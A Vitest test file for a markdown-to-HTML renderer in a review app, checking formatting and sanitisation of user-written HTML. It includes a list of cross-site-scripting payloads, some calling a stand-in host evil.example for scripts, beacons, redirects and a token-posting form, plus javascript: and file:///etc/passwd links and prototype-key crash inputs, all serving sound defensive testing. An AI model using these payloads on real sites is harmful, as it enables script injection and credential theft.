import { beforeAll, describe, expect, it } from 'vitest'
import { renderMarkdown } from '../app/composables/useMd'
import { ready } from '../app/composables/useHighlight'

// Shiki loads its grammars rather than compiling them in, so a fence is plain
// text until it is up. The app is brought back by a repaint; a test has to ask.
beforeAll(() => ready())

/** Tags and entities out, so a test can say what a body reads as. */
const text = (html: string) =>
  html
    .replace(/<[^>]+>/g, '')
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&amp;/g, '&')
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .trim()

describe('renderMarkdown', () => {
  it('carries text over as paragraphs, single newlines kept as breaks', () => {
    const html = renderMarkdown('one\ntwo\n\nthree')
    expect(html).toContain('<br>')
    expect(html).toMatch(/<p>one<br>\s*two<\/p>/)
    expect(html).toContain('<p>three</p>')
  })

  it('reads the markup a body is worth reading, and silences the rest', () => {
    const html = renderMarkdown('<script>alert(1)</script> & <b>bold</b>')
    expect(html).not.toContain('<script')
    // The script's contents go with it rather than being printed as text.
    expect(html).not.toContain('alert')
    expect(html).toContain('<b>bold</b>')
    expect(html).toContain('&amp;')
  })

  it('keeps code exactly as written, in spans and fences', () => {
    expect(renderMarkdown('use `x < 3` here')).toContain('<code>x &lt; 3</code>')
    const html = renderMarkdown('```\nconst a = 1 < 2\n```')
    expect(html).toContain('<pre><code>const a = 1 &lt; 2</code></pre>')
  })

  it('names a fence language as a class and colours what it knows', () => {
    const known = renderMarkdown('```ts\nconst a = 1\n```')
    expect(known).toContain('<pre><code class="language-ts">')
    // Shiki resolves the token against the theme and writes the colour onto the
    // span, so what says it was highlighted is a style rather than a class.
    expect(known).toContain('<span style="color:')
    expect(text(known)).toBe('const a = 1')
    // A language nothing is registered for is still labelled, never guessed at.
    const unknown = renderMarkdown('```wobble\nx\n```')
    expect(text(unknown)).toBe('x')
    expect(unknown).not.toContain('<span style="color:')
  })

  it('does not let a fence language break out of its attribute', () => {
    const spaced = renderMarkdown('```"><img src=x onerror=alert(document.domain)>\nx\n```')
    const packed = renderMarkdown('```"><img/src=x/onerror=alert(document.domain)>\nx\n```')
    const quoted = renderMarkdown('```ts"onmouseover="alert(1)\nx\n```')
    for (const html of [spaced, packed, quoted]) {
      expect(html).not.toContain('<img')
      expect(html).not.toContain('<svg')
      expect(html).not.toMatch(/class="language-/)
    }
  })

  it('links named and bare urls, and only schemes worth clicking', () => {
    const named = renderMarkdown('[site](https://example.com)')
    expect(named).toContain('href="https://example.com"')
    expect(named).toContain('target="_blank"')
    expect(named).toContain('rel="noopener noreferrer"')
    expect(renderMarkdown('see https://example.com/x')).toContain('href="https://example.com/x"')
    expect(renderMarkdown('write to <bob@example.com>')).toContain('href="mailto:bob@example.com"')
    for (const bad of ['[x](javascript:alert(1))', '[x](file:///etc/passwd)', '[x](data:text/html,x)']) {
      expect(renderMarkdown(bad)).not.toContain('<a')
    }
  })

  it('does not nest one link inside another', () => {
    const html = renderMarkdown('[https://example.com](https://example.com)')
    expect(html.match(/<a /g)).toHaveLength(1)
  })

  it('marks emphasis, deletions, mentions and references', () => {
    const html = renderMarkdown('**bold** and *em* and ~~gone~~\n@robin see #36')
    expect(html).toContain('<strong>bold</strong>')
    expect(html).toContain('<em>em</em>')
    expect(html).toContain('<s>gone</s>')
    expect(html).toContain('<span class="mention">@robin</span>')
    expect(html).toContain('<span class="ref">#36</span>')
  })

  it('chips every mention and reference in a line, punctuation and all', () => {
    const html = renderMarkdown('Thanks @nadia and @sam. Closes #64, and unblocks #71.')
    expect(html).toContain('<span class="mention">@nadia</span>')
    expect(html).toContain('<span class="mention">@sam</span>.')
    expect(html).toContain('<span class="ref">#64</span>,')
    // The full stop ending the sentence is not part of the number.
    expect(html).toContain('<span class="ref">#71</span>.')
  })

  it('leaves a mention alone inside code, inside a link and inside a url', () => {
    expect(renderMarkdown('`@robin`')).not.toContain('class="mention"')
    expect(renderMarkdown('[@robin](https://example.com/robin)')).not.toContain('class="mention"')
    expect(renderMarkdown('https://example.com/x#36')).not.toContain('class="ref"')
    // `#` in front of anything but a number is a heading mark or a fragment,
    // never a request number.
    expect(renderMarkdown('the #main branch')).not.toContain('class="ref"')
  })

  it('draws headings, quotes, rules and lists at every level', () => {
    expect(renderMarkdown('## Title')).toContain('<h2>Title</h2>')
    expect(renderMarkdown('###### Small')).toContain('<h6>Small</h6>')
    expect(renderMarkdown('Title\n=====')).toContain('<h1>Title</h1>')
    expect(renderMarkdown('> quoted')).toContain('<blockquote>')
    expect(renderMarkdown('---')).toContain('<hr>')
    expect(renderMarkdown('- one\n- two')).toMatch(/<ul>[\s\S]*<li>one<\/li>/)
    expect(renderMarkdown('1. a\n2. b')).toMatch(/<ol>[\s\S]*<li>a<\/li>/)
  })

  it('nests a list inside a list rather than flattening it', () => {
    const html = renderMarkdown('- one\n  - inner\n- two')
    expect(html.match(/<ul>/g)).toHaveLength(2)
    expect(html).toMatch(/<li>one[\s\S]*<ul>[\s\S]*inner/)
  })

  it('draws a task list as boxes, ticked and not', () => {
    const html = renderMarkdown('- [x] done\n- [ ] not done')
    expect(html).toContain('<span class="task-box done" aria-hidden="true"></span>')
    expect(html).toContain('<span class="task-box" aria-hidden="true"></span>')
    expect(html).toContain('<li class="task">')
    expect(text(html)).toContain('done')
    expect(html).not.toContain('[x]')
  })

  it('draws a table', () => {
    const html = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |')
    expect(html).toContain('<table>')
    expect(html).toContain('<th>a</th>')
    expect(html).toContain('<td>1</td>')
  })

  it('draws an image, fetched late and without a referrer', () => {
    const html = renderMarkdown('![a shot](https://example.com/x.png)')
    expect(html).toContain('<img src="https://example.com/x.png"')
    expect(html).toContain('alt="a shot"')
    expect(html).toContain('loading="lazy"')
    expect(html).toContain('referrerpolicy="no-referrer"')
  })

  it('hides the html comments a request template is mostly made of', () => {
    const body = [
      '<!-- Say what this changes and why. -->',
      '## What',
      'A fix.',
      '<!--',
      'Several lines of instructions',
      'nobody was meant to read.',
      '-->',
      'Done.'
    ].join('\n')
    const html = renderMarkdown(body)
    expect(html).not.toContain('&lt;!--')
    expect(html).not.toContain('instructions')
    expect(text(html)).toContain('A fix.')
    expect(text(html)).toContain('Done.')
  })

  it('leaves a comment inside a fence alone, since it is being shown on purpose', () => {
    const html = renderMarkdown('```html\n<!-- kept -->\n```')
    expect(text(html)).toContain('<!-- kept -->')
  })

  it('reads through the tags a body is folded and broken with', () => {
    const html = renderMarkdown('<details><summary>The log</summary>\n\nline one\n</details>')
    expect(html).not.toContain('&lt;details&gt;')
    expect(text(html)).toContain('The log')
    expect(text(html)).toContain('line one')
    expect(renderMarkdown('one<br>two')).toContain('<br>')
  })

  it('says nothing about whitespace alone, or about a body of comments alone', () => {
    expect(renderMarkdown('')).toBe('')
    expect(renderMarkdown('  \n ')).toBe('')
    expect(renderMarkdown('<!-- nothing but this -->')).toBe('')
  })
})

/**
 * Both forges render plain HTML in a body, so people write it, and a request
 * that arrived as literal `&lt;details&gt;` was unreadable. What follows is
 * the two halves of reading it: the markup worth drawing, and the markup that
 * must not survive the trip.
 */
describe('renderMarkdown, on the html people write in a body', () => {
  it('draws the inline tags a body is marked up with', () => {
    const html = renderMarkdown(
      'a <b>bold</b> <i>slanted</i> <u>underlined</u> <mark>marked</mark> ' +
        'H<sub>2</sub>O, x<sup>2</sup>, press <kbd>Ctrl</kbd>, <small>aside</small>'
    )
    for (const tag of ['b', 'i', 'u', 'mark', 'sub', 'sup', 'kbd', 'small']) {
      expect(html).toContain(`<${tag}>`)
      expect(html).toContain(`</${tag}>`)
    }
  })

  it('folds a details block and reads the markdown inside it', () => {
    const html = renderMarkdown(
      '<details>\n<summary>The log</summary>\n\nline **one**\n\n</details>'
    )
    expect(html).toContain('<details>')
    expect(html).toContain('<summary>The log</summary>')
    expect(html).toContain('<strong>one</strong>')
    expect(html).toContain('</details>')
  })

  it('keeps a fold open when it was written open, and nothing else it carries', () => {
    const html = renderMarkdown('<details open class="x" onclick="alert(1)"><summary>a</summary></details>')
    expect(html).toContain('<details open>')
    expect(html).not.toContain('class=')
    expect(html).not.toContain('onclick')
  })

  it('centres a badge row and sizes the image in it', () => {
    const html = renderMarkdown(
      '<p align="center"><img src="https://example.com/a.png" width="600" alt="a shot"></p>'
    )
    expect(html).toContain('<p align="center">')
    expect(html).toContain('<img src="https://example.com/a.png"')
    expect(html).toContain('width="600"')
    expect(html).toContain('alt="a shot"')
    // The same policy the markdown path applies to an image it drew itself.
    expect(html).toContain('loading="lazy"')
    expect(html).toContain('referrerpolicy="no-referrer"')
  })

  it('draws a table written as tags, spans and all', () => {
    const html = renderMarkdown(
      '<table><tr><th colspan="2" align="left">both</th></tr><tr><td>1</td><td>2</td></tr></table>'
    )
    expect(html).toContain('<table>')
    expect(html).toContain('<th colspan="2" align="left">')
    expect(html).toContain('<td>1</td>')
  })

  it('sends a written-out link to the browser like any other', () => {
    const html = renderMarkdown('see <a href="https://example.com/x" title="there">this</a>')
    expect(html).toContain('href="https://example.com/x"')
    expect(html).toContain('title="there"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('rel="noopener noreferrer"')
  })

  it('drops a picture down to the image inside it', () => {
    const html = renderMarkdown(
      '<picture><source srcset="https://example.com/dark.png" media="(prefers-color-scheme: dark)">' +
        '<img src="https://example.com/light.png" alt="shot"></picture>'
    )
    expect(html).not.toContain('<picture')
    expect(html).not.toContain('<source')
    expect(html).not.toContain('srcset')
    expect(html).toContain('<img src="https://example.com/light.png"')
  })

  it('unwraps a tag it has no vocabulary for, keeping what it wrapped', () => {
    const html = renderMarkdown('<div class="wrapper"><section>kept text</section></div>')
    expect(html).not.toContain('<section')
    expect(html).not.toContain('class=')
    expect(text(html)).toContain('kept text')
  })

  it('closes a fold the body left open, so it cannot swallow what follows', () => {
    const html = renderMarkdown('<details><summary>a</summary>\n\nbody')
    expect(html.match(/<details>/g)).toHaveLength(1)
    expect(html).toContain('</details>')
    // And a closing tag nothing opened closes nothing.
    expect(renderMarkdown('</details>plain')).not.toContain('</details>')
  })

  it('leaves markup inside a fence as the text it is being shown as', () => {
    const html = renderMarkdown('```html\n<b>shown</b>\n```')
    expect(text(html)).toContain('<b>shown</b>')
    // Drawn as text, never as the element it names.
    expect(html).not.toContain('<b>shown')
  })
})

describe('renderMarkdown, on markup that must not survive the trip', () => {
  /** Nothing here may reach the window as anything but text. */
  const HOSTILE = [
    '<script>alert(1)</script>',
    '<script src="https://evil.example/x.js"></script>',
    '<img src="https://example.com/x.png" onerror="alert(1)">',
    '<img src=x onerror=alert(1)>',
    '<b onclick="alert(1)">click</b>',
    '<b ONMOUSEOVER="alert(1)">hover</b>',
    '<a href="javascript:alert(1)">go</a>',
    '<a href="&#106;avascript&colon;alert(1)">go</a>',
    '<a href="java\tscript:alert(1)">go</a>',
    '<a href="data:text/html,<script>alert(1)</script>">go</a>',
    '<iframe src="https://evil.example"></iframe>',
    '<style>body { display: none }</style>',
    '<p style="background:url(https://evil.example/beacon)">x</p>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<base href="https://evil.example/">',
    '<object data="https://evil.example/x.swf"></object>',
    '<embed src="https://evil.example/x.swf">',
    '<svg><script>alert(1)</script></svg>',
    '<svg onload="alert(1)"></svg>',
    '<math><mtext><script>alert(1)</script></mtext></math>',
    '<template><script>alert(1)</script></template>',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<form action="https://evil.example"><input name="token"><button>go</button></form>',
    '<textarea></textarea><script>alert(1)</script>',
    '<b <img src=x onerror=alert(1)>',
    '<div id="app" class="taken" data-x="1">x</div>'
  ]

  it.each(HOSTILE)('neutralises %s', (body) => {
    const html = renderMarkdown(body)
    // Nothing that runs.
    expect(html).not.toMatch(/<script/i)
    expect(html).not.toMatch(/\son[a-z]+\s*=/i)
    expect(html).not.toMatch(/javascript:/i)
    // Nothing that draws something this window has no business drawing.
    expect(html).not.toMatch(/<(?:iframe|object|embed|svg|math|template|form|input|button|noscript)/i)
    // Nothing that restyles or redirects the window it is being read in.
    expect(html).not.toMatch(/<(?:style|meta|link|base)/i)
    expect(html).not.toMatch(/\s(?:style|class|id|data-[\w-]+)\s*=/i)
  })

  it('takes the contents of a silenced tag with it rather than printing them', () => {
    expect(text(renderMarkdown('<style>body { display: none }</style>'))).toBe('')
    expect(text(renderMarkdown('<script>alert(1)</script>'))).toBe('')
    expect(text(renderMarkdown('before<iframe>inside</iframe>after'))).toBe('beforeafter')
  })

  it('keeps the words when it drops the tag they were written in', () => {
    expect(text(renderMarkdown('<a href="javascript:alert(1)">the words</a>'))).toContain('the words')
    expect(text(renderMarkdown('<b onclick="alert(1)">the words</b>'))).toContain('the words')
    expect(renderMarkdown('<b onclick="alert(1)">the words</b>')).toContain('<b>the words</b>')
  })

  it('refuses an image that is not fetched over the network', () => {
    for (const bad of [
      '<img src="data:image/svg+xml,<svg onload=alert(1)>">',
      '<img src="javascript:alert(1)">',
      '<img src="file:///etc/passwd">',
      '<img alt="no source at all">'
    ]) {
      expect(renderMarkdown(bad)).not.toContain('<img')
    }
  })

  it('rebuilds a tag rather than copying it, so both readings agree', () => {
    // A browser reads this as a `b` carrying an `onerror`; markdown-it reads
    // the `<b ` as text and the rest as an `img`. Neither reading survives,
    // because the bytes do not: what is drawn is built from the vocabulary,
    // and what is not in it is drawn as the characters it was written with.
    const html = renderMarkdown('<b <img src=x onerror=alert(1)>bold</b>')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('<img')
    expect(html).toContain('&lt;b')
    expect(text(html)).toContain('bold')
  })

  it('will not let a comment stitched out of a body assemble a tag', () => {
    // `withoutComments` deletes the comment before the parser runs, which can
    // join what sat either side of it. What it joins goes through the same
    // vocabulary as anything else.
    const html = renderMarkdown('<im<!-- -->g src=x onerror=alert(1)>')
    expect(html).not.toContain('onerror')
    expect(html).not.toContain('<img')
  })

  it('keeps a link whose address is merely long and ordinary', () => {
    const html = renderMarkdown('<a href="https://example.com/a?b=1&amp;c=2#d">x</a>')
    expect(html).toContain('href="https://example.com/a?b=1&amp;c=2#d"')
  })

  /**
   * The vocabulary is three plain objects, and a plain object answers for
   * every name on `Object.prototype`. Before this was checked, `<constructor>`
   * passed the one gate that decides what a tag is allowed to be, `constructor`
   * passed as an attribute on every kept tag, and `<constructor is>` threw
   * `value.replace is not a function` straight out of the renderer — which is
   * called inside four `v-html` bindings, so a sixteen character body took the
   * review pane down for anyone who opened it.
   */
  describe('names that a plain object answers for anyway', () => {
    it('is not a tag, however it is spelled', () => {
      for (const body of ['<constructor>x</constructor>', '<CONSTRUCTOR>x</CONSTRUCTOR>']) {
        const html = renderMarkdown(body)
        expect(html).not.toContain('constructor')
        expect(text(html)).toContain('x')
      }
    })

    it('is not an attribute, on any tag that has any', () => {
      for (const tag of ['p', 'b', 'span', 'code', 'td', 'details', 'summary']) {
        expect(renderMarkdown(`<${tag} constructor="INJECTED">hi</${tag}>`)).not.toContain(
          'INJECTED'
        )
      }
      const link = renderMarkdown('<a href="https://ok.example" constructor="INJECTED">x</a>')
      expect(link).toContain('href="https://ok.example"')
      expect(link).not.toContain('INJECTED')
    })

    it('does not throw the renderer, whichever of them is asked for', () => {
      const keys = [
        'is',
        'name',
        'keys',
        'create',
        'bind',
        'call',
        'apply',
        'length',
        'prototype',
        'arguments',
        'caller',
        'entries',
        'values',
        'constructor'
      ]
      for (const key of keys) {
        expect(() => renderMarkdown(`<constructor ${key}>`)).not.toThrow()
        expect(() => renderMarkdown(`<constructor ${key}="x">`)).not.toThrow()
        expect(() => renderMarkdown(`<p ${key}="x">body</p>`)).not.toThrow()
      }
      // The shape it was found as: ordinary prose either side of it.
      const html = renderMarkdown('Thanks for the patch!\n\n<constructor is>\n\nLGTM')
      expect(text(html)).toContain('LGTM')
    })

    it('is not an entity either, so an address is not rewritten by one', () => {
      for (const name of ['toString', 'valueOf', 'constructor', 'hasOwnProperty']) {
        const html = renderMarkdown(`<a href="https://ok.example/&${name};">y</a>`)
        expect(html).not.toContain('native')
        expect(html).not.toContain('function')
      }
    })
  })

  it('says a value once, rather than escaping what was already escaped', () => {
    expect(renderMarkdown('<abbr title="Tom &amp; Jerry">t</abbr>')).toContain(
      'title="Tom &amp; Jerry"'
    )
    expect(renderMarkdown('<img src="https://e.example/a.png" alt="A &amp; B">')).toContain(
      'alt="A &amp; B"'
    )
    // Which must not become a way to write an address twice over: a value is
    // read once, so `&amp;#106;` is `&#106;` and not `j`.
    expect(renderMarkdown('<a href="&amp;#106;avascript:alert(1)">x</a>')).not.toContain('<a')
  })

  it('keeps the prose either side of something it silences', () => {
    expect(text(renderMarkdown('<div>hello<script>x</script>world</div>'))).toBe('helloworld')
    expect(text(renderMarkdown('before<iframe>inside</iframe>after'))).toBe('beforeafter')
  })

  it('does not delete a comment for naming a tag in a sentence', () => {
    for (const tag of ['style', 'button', 'video', 'select', 'form', 'object', 'title']) {
      const html = renderMarkdown(`Use <${tag}> to fix it.\n\nSecond paragraph.`)
      expect(text(html)).toContain('Second paragraph.')
    }
    // And a real element is still silenced whole, contents and all.
    expect(text(renderMarkdown('<style>\nbody { display: none }\n</style>\n\nAfter.'))).toBe(
      'After.'
    )
  })

  it('draws a recording as the way to it, rather than as nothing', () => {
    const html = renderMarkdown(
      'Recording:\n\n<video src="https://github.com/u/a/assets/1/a%20clip.mp4"></video>\n\nRest.'
    )
    expect(html).toContain('href="https://github.com/u/a/assets/1/a%20clip.mp4"')
    expect(text(html)).toContain('a clip.mp4')
    expect(text(html)).toContain('Rest.')
    // Not a player, which the release policy would refuse to load anyway.
    expect(html).not.toContain('<video')
  })

  it('closes an inline tag where it was opened, not at the end of the body', () => {
    const html = renderMarkdown('<b>one\n\ntwo\n\nthree')
    expect(html).toContain('<b>one</b>')
    expect(html).not.toMatch(/<\/b>\s*$/)
    // The shape that mattered: one unclosed link is not a comment sized
    // button to wherever it points.
    const link = renderMarkdown('<a href="https://evil.example/x">\n\nPlease review.\n\n- one')
    expect(link).toContain('</a>')
    expect(link).not.toMatch(/<a [^>]*>\s*<p>/)
    // A fold is still allowed to wrap several blocks, which is the point of it.
    const fold = renderMarkdown('<details><summary>s</summary>\n\nbody\n\n</details>')
    expect(fold).toMatch(/<details>[\s\S]*<p>body<\/p>[\s\S]*<\/details>/)
  })

  it('draws a tag a slash was written into as text, and never as markup', () => {
    // markdown-it does not read `<img/src=x>` as a tag at all — its own
    // pattern wants whitespace before an attribute — so this never reaches
    // the vocabulary and comes out as the characters it was written with.
    // That is safe, and it is what is asserted; the scanner tolerates the
    // slash for the chunks that do reach it.
    const html = renderMarkdown('<img/src="https://e.example/a.png"/onerror="alert(1)">')
    expect(html).not.toContain('<img')
    expect(html).not.toMatch(/\son[a-z]+\s*=/i)
    const svg = renderMarkdown('<svg/onload="alert(1)"></svg>')
    expect(svg).not.toContain('<svg')
    expect(svg).not.toMatch(/\son[a-z]+\s*=/i)
  })

  it('closes a tag that was written as though it closed itself', () => {
    const html = renderMarkdown('<b/>after')
    expect(html).toContain('<b></b>')
    expect(text(html)).toContain('after')
  })

  it('keeps what an image said it showed, when it cannot be shown', () => {
    const html = renderMarkdown('<img src="./docs/shot.png" alt="the toolbar">')
    expect(html).not.toContain('<img')
    expect(text(html)).toContain('the toolbar')
  })

  it('cannot be shielded from that by opening a block tag behind it', () => {
    // A tag allowed to outlive its block used to hide an inline one under it,
    // which put the link back around every paragraph that followed.
    for (const shield of ['td', 'li', 'div', 'details', 'table', 'ul', 'pre']) {
      const html = renderMarkdown(
        `<a href="https://evil.example/"><${shield}>click\n\nsecond\n\nthird`
      )
      // Whatever else it opened, the link closes in the block it was written
      // in, so nothing after that block is inside it.
      expect(html).toContain('</a>')
      expect(html.indexOf('</a>')).toBeLessThan(html.indexOf('second'))
    }
    const stacked = renderMarkdown('<b><i><u><td>x\n\nsecond\n\nthird')
    for (const tag of ['b', 'i', 'u']) {
      expect(stacked).toContain(`</${tag}>`)
      expect(stacked.indexOf(`</${tag}>`)).toBeLessThan(stacked.indexOf('second'))
    }
  })

  it('does not close a tag after whatever was holding it has already closed', () => {
    // A `<td>` written inside a list item is not a table: it closes where it
    // was written, rather than after the list it was written in.
    for (const body of ['- <td>item\n- second\n\nafter', '> <td>quoted\n\nafter']) {
      const html = renderMarkdown(body)
      expect(html).not.toMatch(/<\/(?:ul|blockquote)>[\s\S]*<\/td>/)
      expect(text(html)).toContain('after')
    }
  })

  it('says a table column is aligned in the one way a body is allowed to', () => {
    const html = renderMarkdown('| a |\n|:-:|\n| b |')
    expect(html).not.toContain('style=')
    expect(html).toContain('<th align="center">')
    expect(html).toContain('<td align="center">')
    expect(renderMarkdown('| a |\n|--:|\n| b |')).toContain('align="right"')
  })

  it('keeps the words written after a recording, in its line and after it', () => {
    for (const body of [
      'before <video src="https://e.example/x.mp4"> after',
      'before <video src="https://e.example/x.mp4"></video> after'
    ]) {
      const read = text(renderMarkdown(body))
      expect(read).toContain('before')
      expect(read).toContain('after')
    }
    // And one with nothing to point at loses nothing but itself.
    expect(text(renderMarkdown('<video src="">after'))).toContain('after')
    expect(text(renderMarkdown('<audio srcset="https://e.example/a.mp3">after'))).toContain('after')
  })

  it('ends a declaration where its own kind ends', () => {
    expect(renderMarkdown('<![CDATA[<img src=x onerror=alert(1)>]]>')).not.toContain(']]&gt;')
    expect(renderMarkdown('<![CDATA[x]]>after')).toContain('after')
  })
})
